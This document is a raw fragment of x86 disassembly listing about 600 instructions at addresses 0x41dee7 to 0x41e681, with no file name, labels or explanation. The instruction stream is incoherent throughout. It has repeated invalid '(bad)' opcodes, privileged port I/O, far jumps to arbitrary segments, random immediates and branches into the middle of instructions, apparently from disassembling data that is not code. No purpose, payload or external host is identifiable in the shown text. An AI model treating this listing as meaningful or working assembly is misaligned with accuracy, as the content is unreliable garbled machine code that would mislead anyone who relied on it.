  41dee7:	imul   esi,DWORD PTR [ecx],0x541b8df6
  41deed:	mov    cl,0xcb
  41deef:	mov    eax,0xd902c0d
  41def4:	cmp    ah,cl
  41def6:	xor    al,0x66
  41def8:	dec    ebx
  41def9:	adc    BYTE PTR [ecx+ebx*8+0x3d13c2],dh
  41df00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df01:	test   DWORD PTR [ecx+0x7360c930],ebp
  41df07:	and    eax,0x90a5e19b
  41df0c:	add    ebp,DWORD PTR ds:0x58215ed4
  41df12:	push   esp
  41df13:	(bad)  
  41df14:	cdq    
  41df15:	mov    ah,0xba
  41df17:	mov    ebx,0x1ea6cff9
  41df1c:	fs push ebx
  41df1e:	push   ss
  41df1f:	pop    ecx
  41df20:	jg     0x41df85
  41df22:	sub    ch,bl
  41df24:	push   esp
  41df25:	ins    BYTE PTR es:[edi],dx
  41df26:	scas   eax,DWORD PTR es:[edi]
  41df27:	in     al,0xe7
  41df29:	mov    edx,DWORD PTR fs:[edi+0x76]
  41df2d:	xchg   esi,ebx
  41df2f:	icebp  
  41df30:	int3   
  41df31:	aam    0x7f
  41df33:	call   0xddf0:0x8e28b2cf
  41df3a:	mov    dl,0xcd
  41df3c:	je     0x41df0c
  41df3e:	xchg   ebx,eax
  41df3f:	mov    esi,0x67ea5549
  41df44:	jno    0x41df1e
  41df46:	add    BYTE PTR [ebx],bh
  41df48:	mov    eax,0xdefe8295
  41df4d:	or     BYTE PTR [esi-0x7f28287f],0x3f
  41df54:	add    edx,eax
  41df56:	fcom   st(3)
  41df58:	ret    
  41df59:	(bad)  
  41df5a:	dec    edi
  41df5b:	mov    ds,WORD PTR [edx+edx*1]
  41df5e:	adc    ebx,DWORD PTR [ecx-0x2d1e0a1f]
  41df64:	adc    ch,BYTE PTR [eax+0x223cc75b]
  41df6a:	add    edx,ebx
  41df6c:	mov    ah,0x20
  41df6e:	(bad)  
  41df6f:	repnz xchg esi,eax
  41df71:	ret    0xcd64
  41df74:	aas    
  41df75:	sbb    eax,0x2c133cb2
  41df7a:	and    eax,0x736d30f6
  41df7f:	js     0x41df09
  41df81:	push   ebx
  41df82:	and    bl,al
  41df84:	jp     0x41df74
  41df86:	pushf  
  41df87:	out    0x1f,al
  41df89:	add    eax,edx
  41df8b:	jl     0x41df70
  41df8d:	push   ebp
  41df8e:	cmp    al,0xba
  41df90:	fisttp QWORD PTR [eax-0x7b97f92f]
  41df96:	and    ch,BYTE PTR [ebp+ebp*1-0x7a]
  41df9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df9b:	dec    esp
  41df9c:	jno    0x41dfa7
  41df9e:	ficom  WORD PTR [eax+0x79c4f1e6]
  41dfa4:	scas   al,BYTE PTR es:[edi]
  41dfa5:	or     DWORD PTR [ebx],ebp
  41dfa7:	ss jmp 0xb20d952c
  41dfad:	push   esp
  41dfae:	xor    dl,BYTE PTR [edi]
  41dfb0:	fnstcw WORD PTR [edx-0x46]
  41dfb3:	cld    
  41dfb4:	mov    esp,0x77c41a6b
  41dfb9:	jl     0x41dff2
  41dfbb:	in     al,0x33
  41dfbd:	fsubr  st,st(7)
  41dfbf:	mov    edi,0x871c499a
  41dfc4:	push   0xffffff83
  41dfc6:	lahf   
  41dfc7:	pop    eax
  41dfc8:	out    dx,al
  41dfc9:	pop    edi
  41dfca:	or     al,BYTE PTR ds:0x395356d8
  41dfd0:	outs   dx,DWORD PTR ds:[esi]
  41dfd1:	test   BYTE PTR [ebx],0x8c
  41dfd4:	mov    edi,0xc26bc02c
  41dfd9:	or     al,0x30
  41dfdb:	adc    DWORD PTR [ebp-0x56cb3182],ebx
  41dfe1:	test   BYTE PTR [esi-0x2defd494],ch
  41dfe7:	xchg   DWORD PTR [ecx],esp
  41dfe9:	in     eax,0xbc
  41dfeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfec:	mov    cl,0x9f
  41dfee:	fisub  WORD PTR [eax]
  41dff0:	mov    cl,ch
  41dff2:	loopne 0x41dfbd
  41dff4:	inc    ebp
  41dff5:	aas    
  41dff6:	fbld   TBYTE PTR [ebx]
  41dff8:	xor    eax,0x4f57047d
  41dffd:	int3   
  41dffe:	fwait
  41dfff:	ins    BYTE PTR es:[edi],dx
  41e000:	ret    0x1836
  41e003:	sub    dl,cl
  41e005:	adc    al,BYTE PTR [ebx-0x21]
  41e008:	aad    0xd4
  41e00a:	push   0xb758b6e
  41e00f:	fs inc edi
  41e011:	int    0xad
  41e013:	cdq    
  41e014:	push   ebp
  41e015:	int    0xa0
  41e017:	mov    eax,DWORD PTR [eax]
  41e019:	sbb    al,cl
  41e01b:	test   BYTE PTR [eax-0x27878b43],bh
  41e021:	iret   
  41e022:	adc    al,0x4
  41e024:	sub    esi,DWORD PTR ds:[edx+ecx*2]
  41e028:	xchg   edi,eax
  41e029:	std    
  41e02a:	bound  esi,QWORD PTR [esi-0x20e968cc]
  41e030:	and    BYTE PTR ds:0xe777449d,cl
  41e036:	test   al,0x3e
  41e038:	xor    BYTE PTR [ebp-0x2f11ce4],ah
  41e03e:	cdq    
  41e03f:	(bad)
  41e042:	(bad)  
  41e044:	dec    eax
  41e045:	cs inc ebp
  41e047:	cmp    edx,DWORD PTR [ebp-0x65]
  41e04a:	int3   
  41e04b:	in     al,dx
  41e04c:	popf   
  41e04d:	out    dx,al
  41e04e:	and    esp,DWORD PTR [eax]
  41e050:	iret   
  41e051:	lds    edi,FWORD PTR [esi]
  41e053:	pop    ds
  41e054:	and    BYTE PTR [eax+0x6a3d515e],0x95
  41e05b:	dec    ebp
  41e05c:	mov    ecx,DWORD PTR [eax-0xa91a389]
  41e062:	test   DWORD PTR [edx+0x5cc1c431],0x6c4949cf
  41e06c:	loope  0x41e03f
  41e06e:	or     bh,BYTE PTR [ecx+0x3392f4fc]
  41e074:	fwait
  41e075:	mov    ebx,0x62e17aab
  41e07a:	pop    ebx
  41e07b:	xor    eax,0x1470332f
  41e080:	lea    ecx,[eax]
  41e082:	jmp    0xf9524ac2
  41e087:	or     ecx,DWORD PTR [esp+edx*8]
  41e08a:	imul   ecx,DWORD PTR [ebx-0x1f],0xffffff90
  41e08e:	leave  
  41e08f:	pop    esp
  41e090:	lfs    ecx,FWORD PTR [edi]
  41e093:	lods   al,BYTE PTR ds:[esi]
  41e094:	cwde   
  41e095:	dec    ebx
  41e096:	enter  0x73ea,0x66
  41e09a:	or     al,0xf3
  41e09c:	pusha  
  41e09d:	daa    
  41e09e:	jne    0x41e107
  41e0a0:	fstp   QWORD PTR [ecx]
  41e0a2:	retf   
  41e0a3:	int3   
  41e0a4:	loope  0x41e125
  41e0a6:	imul   edx,DWORD PTR [edi-0x45],0x8a7483d9
  41e0ad:	push   cs
  41e0ae:	in     eax,0xba
  41e0b0:	daa    
  41e0b1:	fistp  DWORD PTR [esi-0x79d64f45]
  41e0b7:	std    
  41e0b8:	sbb    BYTE PTR [edx-0x19],ch
  41e0bb:	dec    esp
  41e0bc:	or     eax,0x516951df
  41e0c1:	mov    ebx,0x4e22414c
  41e0c6:	push   es
  41e0c7:	xor    DWORD PTR [edx],ebp
  41e0c9:	sbb    al,0x18
  41e0cb:	jmp    0xdc1ed888
  41e0d0:	sbb    edx,edi
  41e0d2:	mov    ah,0xc4
  41e0d4:	std    
  41e0d5:	jae    0x41e0b9
  41e0d7:	mov    bl,0x43
  41e0d9:	mov    ecx,0x5ffde0e8
  41e0de:	or     DWORD PTR [ebp-0x61],edx
  41e0e1:	or     al,0x86
  41e0e3:	aam    0x78
  41e0e5:	dec    ecx
  41e0e6:	lahf   
  41e0e7:	retf   0xe7fb
  41e0ea:	mov    ds:0x7cb67755,al
  41e0ef:	sub    al,0x29
  41e0f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0f2:	int    0x84
  41e0f4:	cmp    BYTE PTR [edi+ebp*2+0x3856a627],0x3a
  41e0fc:	adc    ebp,DWORD PTR [eax]
  41e0fe:	gs push ebp
  41e100:	xchg   esp,eax
  41e101:	lock jg 0x41e0f0
  41e104:	fwait
  41e105:	cli    
  41e106:	push   eax
  41e107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e108:	out    dx,al
  41e109:	lea    ebp,[edi-0x6b]
  41e10c:	(bad)  
  41e10d:	add    DWORD PTR [ebx+0x58],0x20e6e9e8
  41e114:	icebp  
  41e115:	dec    ecx
  41e116:	push   es
  41e117:	push   ebx
  41e118:	xchg   ebp,eax
  41e119:	push   ecx
  41e11a:	mov    dl,0x16
  41e11c:	mov    edx,0xe81f941f
  41e121:	iret   
  41e122:	sub    eax,0x740c1fbc
  41e127:	mov    esp,0x3b11cfae
  41e12c:	push   edx
  41e12d:	jle    0x41e0e7
  41e12f:	(bad)  
  41e130:	pop    ds
  41e131:	sbb    BYTE PTR [ecx-0x41],ah
  41e134:	fimul  WORD PTR [eax+0x152067c]
  41e13a:	pop    edi
  41e13b:	xchg   ecx,eax
  41e13c:	cmp    eax,0x9987bc9d
  41e141:	inc    eax
  41e142:	ins    BYTE PTR es:[edi],dx
  41e143:	fisttp WORD PTR [edi-0x3beb8f77]
  41e149:	call   0x6f7f6aa2
  41e14e:	add    cl,BYTE PTR [edi]
  41e150:	ins    DWORD PTR es:[edi],dx
  41e151:	jno    0x41e0e9
  41e153:	fst    st(7)
  41e155:	fs xchg ebx,eax
  41e157:	call   0x6b8eb4d0
  41e15c:	fucomp st(3)
  41e15e:	dec    edx
  41e15f:	push   ss
  41e160:	lea    edi,[edx-0x1a]
  41e163:	adc    DWORD PTR [ecx-0x56],esi
  41e166:	xchg   ebx,eax
  41e167:	mov    al,bl
  41e169:	pop    ebx
  41e16a:	addr16 xchg esp,eax
  41e16c:	jmp    0x41e153
  41e16e:	and    bh,BYTE PTR ds:0x65ed251f
  41e174:	(bad)  
  41e175:	idiv   DWORD PTR [edi]
  41e177:	mov    ah,BYTE PTR [esi+0x7f59df71]
  41e17d:	pushf  
  41e17e:	retf   0x5141
  41e181:	gs dec edi
  41e183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e184:	mov    ebp,0xdb18e0a0
  41e189:	lahf   
  41e18a:	into   
  41e18b:	in     eax,0x5
  41e18d:	leave  
  41e18e:	dec    eax
  41e18f:	push   es
  41e190:	mov    bl,0x76
  41e192:	(bad)  
  41e193:	js     0x41e178
  41e195:	mov    ah,bl
  41e197:	enter  0x5a5f,0xe
  41e19b:	mov    ebx,0xba2d03d2
  41e1a0:	sub    edx,DWORD PTR ds:0xd1356520
  41e1a6:	add    BYTE PTR [eax],dl
  41e1a8:	retf   
  41e1a9:	imul   ebp,DWORD PTR [esi-0x2e715e4b],0x4a
  41e1b0:	pop    si
  41e1b2:	dec    esi
  41e1b3:	popa   
  41e1b4:	pop    esp
  41e1b5:	sub    al,0xcf
  41e1b7:	daa    
  41e1b8:	in     eax,dx
  41e1b9:	adc    dh,ch
  41e1bb:	call   0x75c082fd
  41e1c0:	pushf  
  41e1c1:	out    0x72,al
  41e1c3:	outs   dx,BYTE PTR ds:[esi]
  41e1c4:	pop    esp
  41e1c5:	aam    0x78
  41e1c7:	ret    
  41e1c8:	xor    BYTE PTR [esi-0x54822813],bh
  41e1ce:	mov    bl,0xab
  41e1d0:	jae    0x41e182
  41e1d2:	lds    edx,FWORD PTR gs:[eax]
  41e1d5:	je     0x41e15a
  41e1d7:	inc    esp
  41e1d8:	pop    ebx
  41e1d9:	lds    esp,FWORD PTR cs:[esi-0x6f02002b]
  41e1e0:	pushf  
  41e1e1:	pop    esp
  41e1e2:	jmp    0xae935d25
  41e1e7:	pop    ebx
  41e1e8:	sbb    bh,BYTE PTR [ebx+0x21]
  41e1eb:	push   0xffffffee
  41e1ed:	and    edi,DWORD PTR [edx+0x5d8732da]
  41e1f3:	arpl   WORD PTR [edi],bx
  41e1f5:	loopne 0x41e265
  41e1f7:	ret    
  41e1f8:	sbb    eax,0x2cbaf585
  41e1fd:	and    eax,0x95ce5d83
  41e202:	fsub   QWORD PTR [ecx]
  41e204:	out    dx,al
  41e205:	(bad)  
  41e206:	cmp    cl,dh
  41e208:	cmp    al,0xd9
  41e20a:	fsqrt  
  41e20c:	add    esp,DWORD PTR [ebp+0x48ed6c77]
  41e212:	mov    eax,ds:0x9379dec8
  41e217:	popa   
  41e218:	sub    eax,0x7a157916
  41e21d:	retf   0x848c
  41e220:	dec    esi
  41e221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e222:	call   0xd913bc99
  41e227:	pop    edi
  41e228:	push   esi
  41e229:	adc    ebx,DWORD PTR [eax]
  41e22b:	ret    
  41e22c:	xchg   DWORD PTR [ebp+0x78ac2631],esi
  41e232:	push   edx
  41e233:	test   eax,0x99e9dfe4
  41e238:	xchg   DWORD PTR [esi+ecx*1],ebp
  41e23b:	adc    BYTE PTR [esi+edi*1],cl
  41e23e:	mov    ss,WORD PTR [eax]
  41e240:	dec    ecx
  41e241:	sti    
  41e242:	fist   DWORD PTR [ecx+0x66]
  41e245:	das    
  41e246:	cdq    
  41e247:	cwde   
  41e248:	mov    ch,0x3a
  41e24a:	dec    eax
  41e24b:	xchg   edi,eax
  41e24c:	add    dh,al
  41e24e:	or     al,0x54
  41e250:	jecxz  0x41e28a
  41e252:	push   edi
  41e253:	mov    BYTE PTR [edx-0x4b908ba6],ah
  41e259:	lods   eax,DWORD PTR ds:[esi]
  41e25a:	out    dx,al
  41e25b:	jbe    0x41e200
  41e25d:	add    ecx,edx
  41e25f:	or     BYTE PTR [edx-0x3f709b59],dh
  41e265:	imul   esp,DWORD PTR gs:[ebx],0xad13ee3
  41e26c:	sbb    DWORD PTR [esi],0xffffff81
  41e26f:	add    ecx,DWORD PTR ds:0x8bea2ac4
  41e275:	out    dx,eax
  41e276:	sbb    al,dl
  41e278:	outs   dx,BYTE PTR ds:[esi]
  41e279:	jmp    0x51777a21
  41e27e:	ds push ds
  41e280:	dec    edx
  41e281:	test   al,0xef
  41e283:	icebp  
  41e284:	imul   ebx
  41e286:	dec    ebp
  41e287:	psubusb mm3,QWORD PTR [ebx-0x4f]
  41e28b:	dec    esi
  41e28c:	adc    eax,0x6bb7691b
  41e291:	mov    dl,0x91
  41e293:	mov    eax,ds:0xbf8878d1
  41e298:	lods   al,BYTE PTR ds:[esi]
  41e299:	shl    dh,1
  41e29b:	mov    ds:0xde2489e0,al
  41e2a0:	idiv   BYTE PTR [esi+0x5f]
  41e2a3:	or     DWORD PTR ds:0xec5df916,0x61
  41e2aa:	cmp    dh,BYTE PTR [ebx]
  41e2ac:	pop    DWORD PTR [ebp-0x454dff3e]
  41e2b2:	push   cs
  41e2b3:	push   0x48
  41e2b5:	sub    al,0x65
  41e2b7:	jl     0x41e25e
  41e2b9:	hlt    
  41e2ba:	mov    WORD PTR [ecx],?
  41e2bc:	jnp    0x41e2d8
  41e2be:	xchg   edi,eax
  41e2bf:	pop    ds
  41e2c0:	in     eax,0x3f
  41e2c2:	xor    BYTE PTR [ebp-0x3913d5ea],al
  41e2c8:	in     al,0xd5
  41e2ca:	mov    BYTE PTR [ebx],bh
  41e2cc:	pop    ecx
  41e2cd:	mov    edx,0xa2e43deb
  41e2d2:	add    edx,eax
  41e2d4:	push   ss
  41e2d5:	daa    
  41e2d6:	repnz loop 0x41e2be
  41e2d9:	rcr    al,cl
  41e2db:	xlat   BYTE PTR ds:[ebx]
  41e2dc:	lds    edi,FWORD PTR [bp+si]
  41e2df:	pushf  
  41e2e0:	xchg   edx,eax
  41e2e1:	neg    DWORD PTR [esi+0x1e]
  41e2e4:	pop    ax
  41e2e6:	mov    es,edi
  41e2e8:	sbb    al,0x72
  41e2ea:	adc    dl,BYTE PTR [eax+0x4210ee3c]
  41e2f0:	and    eax,0x39e81bc8
  41e2f5:	mov    ecx,0xbef34483
  41e2fa:	je     0x41e32b
  41e2fc:	add    BYTE PTR [edi],al
  41e2fe:	sti    
  41e2ff:	xor    ecx,DWORD PTR [ebx-0x34]
  41e302:	pop    eax
  41e303:	xchg   ecx,eax
  41e304:	lods   al,BYTE PTR ds:[esi]
  41e305:	sbb    al,0xe5
  41e307:	icebp  
  41e308:	in     eax,0xc7
  41e30a:	cmp    al,0x23
  41e30c:	mov    al,ds:0x3dd42fd4
  41e311:	and    al,0x1d
  41e313:	jb     0x41e35b
  41e315:	into   
  41e316:	adc    BYTE PTR ds:0x68d3f9d7,dh
  41e31c:	jl     0x41e38a
  41e31e:	jno    0x41e318
  41e320:	lods   al,BYTE PTR ds:[esi]
  41e321:	jecxz  0x41e35c
  41e323:	je     0x41e2da
  41e325:	pop    esi
  41e326:	(bad)  
  41e327:	jp     0x41e2d5
  41e329:	scas   eax,DWORD PTR es:[edi]
  41e32a:	jle    0x41e2ac
  41e32c:	cmc    
  41e32d:	icebp  
  41e32e:	icebp  
  41e32f:	shl    DWORD PTR [edx+0x30],0x3f
  41e333:	dec    ebp
  41e334:	aaa    
  41e335:	fcomp  QWORD PTR [edi-0xd]
  41e338:	mov    WORD PTR [eax],ss
  41e33a:	jns    0x41e37a
  41e33c:	adc    DWORD PTR [eax],edx
  41e33e:	je     0x41e2e3
  41e340:	mov    esp,0xd0bf9458
  41e345:	mov    ecx,edx
  41e347:	lahf   
  41e348:	sub    BYTE PTR [edi],cl
  41e34a:	jecxz  0x41e2e2
  41e34c:	out    0xfd,eax
  41e34e:	mov    WORD PTR [ebx+0x1f5513d5],gs
  41e354:	loop   0x41e327
  41e356:	add    BYTE PTR [ebx-0x1998a17b],0x90
  41e35d:	pop    esp
  41e35e:	dec    edx
  41e35f:	jae    0x41e322
  41e361:	mov    DWORD PTR [eax],esp
  41e363:	pop    ebx
  41e364:	sub    bl,BYTE PTR [eax-0x6b]
  41e367:	in     al,0xd1
  41e369:	test   DWORD PTR [ebp+0x32],esi
  41e36c:	popa   
  41e36d:	xchg   ebx,eax
  41e36f:	and    al,0x0
  41e371:	mov    dl,0x14
  41e373:	mov    esi,DWORD PTR [ebx-0x52]
  41e376:	sub    BYTE PTR [eax-0x109752d3],dh
  41e37c:	dec    edx
  41e37d:	fimul  DWORD PTR [ebp-0x64]
  41e380:	into   
  41e381:	add    ah,bl
  41e383:	out    dx,eax
  41e384:	popf   
  41e385:	mov    al,0xa
  41e387:	pop    ebx
  41e388:	(bad)  
  41e389:	enter  0xd343,0xf0
  41e38d:	into   
  41e38e:	clc    
  41e38f:	jge    0x41e3e9
  41e391:	mov    ds:0xc19539dc,al
  41e396:	xchg   ecx,eax
  41e397:	sti    
  41e398:	pop    ecx
  41e399:	fwait
  41e39a:	pop    ebp
  41e39b:	sbb    DWORD PTR [eax-0x7d99043f],esp
  41e3a1:	stos   BYTE PTR es:[edi],al
  41e3a2:	pop    edi
  41e3a3:	clc    
  41e3a4:	popa   
  41e3a5:	ss push ebx
  41e3a7:	xchg   ecx,eax
  41e3a8:	jmp    0x41e429
  41e3aa:	scas   al,BYTE PTR es:[edi]
  41e3ab:	cli    
  41e3ac:	push   edx
  41e3ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3ae:	adc    eax,0x3dde2f09
  41e3b3:	sub    al,0x3c
  41e3b5:	lock call 0x980ee053
  41e3bb:	and    BYTE PTR [edi+0xb],0xcc
  41e3bf:	call   0xee43:0x436963
  41e3c6:	add    eax,0x4d2fb23b
  41e3cb:	aam    0xc2
  41e3cd:	fisub  WORD PTR [eax-0x5d323313]
  41e3d3:	jbe    0x41e3b2
  41e3d5:	adc    bl,al
  41e3d7:	xchg   ebx,eax
  41e3d8:	imul   ecx,DWORD PTR [edi+0x70],0x740e5384
  41e3df:	and    BYTE PTR [ebp-0x77315f6],bl
  41e3e5:	rcr    BYTE PTR [esi-0xec5fa88],0xb2
  41e3ec:	cmp    DWORD PTR [ebp-0x10],ebp
  41e3ef:	jne    0x41e374
  41e3f1:	imul   edx,DWORD PTR [ecx+0x5],0x836481dc
  41e3f8:	cmp    al,0xed
  41e3fa:	aam    0xfb
  41e3fc:	addr16 xor ebx,ebx
  41e3ff:	push   ds
  41e400:	xchg   ebp,eax
  41e401:	push   eax
  41e402:	inc    esi
  41e403:	or     eax,0x2f0c13bc
  41e408:	and    al,BYTE PTR [edx+0x1e]
  41e40b:	sub    eax,0xc1704717
  41e410:	pusha  
  41e411:	adc    BYTE PTR [esi+0x5b],al
  41e414:	xchg   DWORD PTR [ebp+eax*2+0x42],ecx
  41e418:	loop   0x41e493
  41e41a:	sub    BYTE PTR [eax+0x21],dh
  41e41d:	push   ebx
  41e41e:	mov    al,0xc
  41e420:	jb     0x41e3a2
  41e422:	xchg   edi,eax
  41e423:	mov    esp,0x83fb33d0
  41e428:	mov    dl,BYTE PTR [edx+0x2c]
  41e42b:	sbb    DWORD PTR [ecx-0x2cd37748],edx
  41e431:	ret    0x45c8
  41e434:	lock cli 
  41e436:	(bad)  
  41e437:	test   al,0xad
  41e439:	mov    esp,0xdf6f8ec9
  41e43e:	push   0x71682b44
  41e443:	nop
  41e444:	les    edi,FWORD PTR [esi+0x4b]
  41e447:	pop    edx
  41e448:	or     al,0xc5
  41e44a:	inc    eax
  41e44b:	fldcw  WORD PTR [edi]
  41e44d:	call   0x8b5:0x769030b0
  41e454:	dec    edx
  41e455:	or     ah,BYTE PTR [eax+0xe]
  41e458:	xchg   ecx,eax
  41e459:	add    BYTE PTR [edx+0x1],al
  41e45c:	stos   DWORD PTR es:[edi],eax
  41e45d:	aaa    
  41e45e:	jno    0x41e4dc
  41e460:	lock and eax,DWORD PTR [ebp-0x50a4a21c]
  41e467:	lock shr DWORD PTR [edx+0x70439476],cl
  41e46e:	repnz (bad) 
  41e471:	push   esi
  41e472:	cmp    ch,BYTE PTR [edi]
  41e474:	mov    ecx,0xbed68e79
  41e479:	pop    esi
  41e47a:	mov    ds:0x1032c468,al
  41e47f:	push   ds
  41e480:	ins    DWORD PTR es:[edi],dx
  41e481:	in     al,dx
  41e482:	and    al,0xfa
  41e484:	stos   DWORD PTR es:[edi],eax
  41e485:	leave  
  41e486:	in     eax,dx
  41e487:	push   esp
  41e488:	fld    DWORD PTR [ebp+eax*8-0x2be7087e]
  41e48f:	ret    
  41e490:	in     al,dx
  41e491:	sbb    ebp,edi
  41e493:	enter  0x4728,0x19
  41e497:	inc    ecx
  41e498:	xor    ebx,DWORD PTR [esi+0x6b7bacbf]
  41e49e:	rcl    DWORD PTR [esp+edi*2],cl
  41e4a1:	je     0x41e500
  41e4a3:	and    BYTE PTR [edx+0x58033b94],ch
  41e4a9:	in     al,0x5
  41e4ab:	cmp    al,cl
  41e4ad:	(bad)  
  41e4ae:	aad    0x90
  41e4b0:	xor    BYTE PTR [ebx+0x2a],bh
  41e4b3:	test   DWORD PTR [edi+0x2],edx
  41e4b6:	test   al,0x1d
  41e4b8:	test   BYTE PTR [ebx],cl
  41e4ba:	out    dx,eax
  41e4bb:	or     DWORD PTR [esi],ebp
  41e4bd:	imul   edx,DWORD PTR [edx+0x2f153187],0xaf1f0677
  41e4c7:	add    BYTE PTR [ebp-0x22e63fc],0x6b
  41e4ce:	lea    ecx,[ebp+0x7e]
  41e4d1:	int3   
  41e4d2:	or     al,BYTE PTR [edi]
  41e4d4:	shr    al,0x6b
  41e4d7:	test   ecx,esi
  41e4d9:	push   0x30
  41e4db:	mov    ebx,DWORD PTR [ebx-0xc761f4c]
  41e4e1:	adc    DWORD PTR [ebp-0x7b227586],ebp
  41e4e7:	ret    0x7d2d
  41e4ea:	loopne 0x41e49c
  41e4ec:	ins    DWORD PTR es:[edi],dx
  41e4ed:	adc    DWORD PTR [ebp-0x80],0xa80a025a
  41e4f4:	sub    eax,0x661e55d
  41e4f9:	outs   dx,DWORD PTR ds:[esi]
  41e4fa:	(bad)  
  41e4fb:	addr16 mov ebp,ebp
  41e4fe:	adc    eax,0x7f57b0dc
  41e503:	clc    
  41e504:	and    dh,0xf8
  41e507:	(bad)  
  41e508:	xor    ecx,DWORD PTR [esi+0x6a]
  41e50b:	cmp    al,0x74
  41e50d:	or     al,0xf3
  41e50f:	push   edi
  41e510:	dec    esi
  41e511:	loope  0x41e58f
  41e513:	aaa    
  41e514:	loop   0x41e4a7
  41e516:	push   0x47
  41e518:	pop    esp
  41e519:	mov    bh,0x87
  41e51b:	and    al,0x73
  41e51d:	retf   
  41e51e:	mov    ebp,0x6c93702e
  41e523:	push   edx
  41e524:	repnz pop esp
  41e526:	loop   0x41e508
  41e528:	sub    bl,BYTE PTR [ebp-0x5c]
  41e52b:	ret    
  41e52c:	adc    BYTE PTR [ecx],dl
  41e52e:	cli    
  41e52f:	xchg   ecx,eax
  41e530:	js     0x41e543
  41e532:	and    eax,0x24ec7c39
  41e537:	out    0x8f,eax
  41e539:	jne    0x41e4e7
  41e53b:	push   eax
  41e53c:	(bad)  
  41e53d:	aaa    
  41e53e:	jbe    0x41e54e
  41e540:	xchg   ebx,edx
  41e542:	xchg   esi,eax
  41e543:	leave  
  41e544:	(bad)  
  41e546:	repz jns 0x41e582
  41e549:	(bad)  
  41e54a:	jmp    0x781c:0x8fa39e47
  41e551:	loop   0x41e50b
  41e553:	loope  0x41e53e
  41e555:	and    ebx,DWORD PTR [ebx]
  41e557:	je     0x41e4ec
  41e559:	fisubr WORD PTR ds:0x9b7f9e79
  41e55f:	dec    eax
  41e560:	les    ecx,FWORD PTR [ebp-0x2f]
  41e563:	popa   
  41e564:	sbb    dh,BYTE PTR [esi-0x65]
  41e567:	mov    esi,eax
  41e569:	mov    eax,0xaab199b
  41e56e:	or     DWORD PTR [ecx],edx
  41e570:	out    dx,eax
  41e571:	or     eax,0x9547a9d3
  41e576:	cli    
  41e577:	xor    al,ah
  41e579:	inc    esi
  41e57a:	cmp    eax,DWORD PTR [edi]
  41e57c:	and    dl,BYTE PTR [ebp+0x6b325c43]
  41e582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e583:	sbb    DWORD PTR [ecx+0x4a],esp
  41e586:	std    
  41e587:	lods   al,BYTE PTR ds:[esi]
  41e588:	xchg   ebx,eax
  41e589:	sbb    esp,ebx
  41e58b:	mov    eax,ds:0x1caf5416
  41e590:	jns    0x41e59c
  41e592:	mov    bl,0xf8
  41e594:	mov    eax,ds:0x14e68fe7
  41e599:	sbb    DWORD PTR [edx],0x290f1dbd
  41e59f:	retf   
  41e5a0:	mov    ds:0xec2e1507,al
  41e5a5:	adc    cl,BYTE PTR [ecx-0x45cbdb6]
  41e5ab:	stos   DWORD PTR es:[edi],eax
  41e5ac:	sub    ebp,ebx
  41e5ae:	fs push ebp
  41e5b0:	cdq    
  41e5b1:	out    dx,eax
  41e5b2:	pop    edx
  41e5b3:	aad    0x7d
  41e5b5:	retf   0x7318
  41e5b8:	(bad)  
  41e5ba:	fistp  QWORD PTR [eax+0x20df8b25]
  41e5c0:	das    
  41e5c1:	dec    ebx
  41e5c2:	xor    dl,bh
  41e5c4:	inc    esi
  41e5c5:	pop    ds
  41e5c6:	mov    bh,BYTE PTR [eax+esi*1+0x63fe3a9b]
  41e5cd:	xchg   esi,eax
  41e5ce:	inc    eax
  41e5cf:	stos   DWORD PTR es:[edi],eax
  41e5d0:	ds and ch,ch
  41e5d3:	mov    cl,0x2b
  41e5d5:	xor    eax,0xf86b9e01
  41e5da:	adc    al,0x2d
  41e5dc:	rol    BYTE PTR [edi-0x1ef7a1e8],0xa6
  41e5e3:	dec    eax
  41e5e4:	loopne 0x41e665
  41e5e6:	sub    eax,DWORD PTR [edi-0x3b]
  41e5e9:	jae    0x41e61e
  41e5eb:	fcmovb st,st(1)
  41e5ed:	shl    BYTE PTR [ecx-0x11f36f7],cl
  41e5f3:	and    eax,0x69b43f9d
  41e5f8:	(bad)  
  41e5f9:	add    BYTE PTR [edi],ch
  41e5fb:	mul    BYTE PTR [ebx+0x6d3bf1e9]
  41e601:	fdivr  st(0),st
  41e603:	ret    0x3af2
  41e606:	loop   0x41e610
  41e608:	bnd jg 0x41e5cc
  41e60b:	mov    edi,ss
  41e60d:	mov    ebp,0xec13dfbc
  41e612:	add    bh,BYTE PTR [edi+0x3e]
  41e615:	cld    
  41e616:	in     eax,dx
  41e617:	cmp    eax,0x5a41f032
  41e61c:	pop    ds
  41e61d:	jmp    0x12fa:0x37988f42
  41e624:	mov    ?,WORD PTR ss:[esi-0x54]
  41e628:	xlat   BYTE PTR ds:[ebx]
  41e629:	pop    ebx
  41e62a:	sbb    ecx,DWORD PTR [ebx+0x68593fca]
  41e630:	adc    edx,DWORD PTR [ebx+0x2]
  41e633:	jge    0x41e5e4
  41e635:	fsub   st,st(6)
  41e637:	imul   ecx,DWORD PTR [esi],0x65
  41e63a:	scas   eax,DWORD PTR es:[di]
  41e63c:	mov    dh,0x5d
  41e63e:	adc    BYTE PTR [eax-0x1e2f1761],cl
  41e644:	xor    eax,0x6752f4ea
  41e649:	sub    al,dl
  41e64b:	(bad)  
  41e64c:	xchg   ebx,eax
  41e64d:	mov    al,ds:0x66e2e385
  41e652:	aas    
  41e653:	xor    al,0xe6
  41e655:	mov    esi,0x9b0affa9
  41e65a:	retf   
  41e65b:	pushf  
  41e65c:	cmp    BYTE PTR [ebp+0x55cafa75],al
  41e662:	imul   edx,DWORD PTR [edi+0x71ce7c81],0x4e
  41e669:	daa    
  41e66a:	cmp    DWORD PTR [ebx+ebx*4-0x419f4746],esi
  41e671:	clc    
  41e672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e673:	ins    DWORD PTR es:[edi],dx
  41e674:	and    dh,BYTE PTR [ecx]
  41e676:	or     BYTE PTR [esi-0x8],ch
  41e679:	rcl    DWORD PTR [edx+0x77a1648],0x19
  41e680:	dec    esi
  41e681:	in     eax,dx
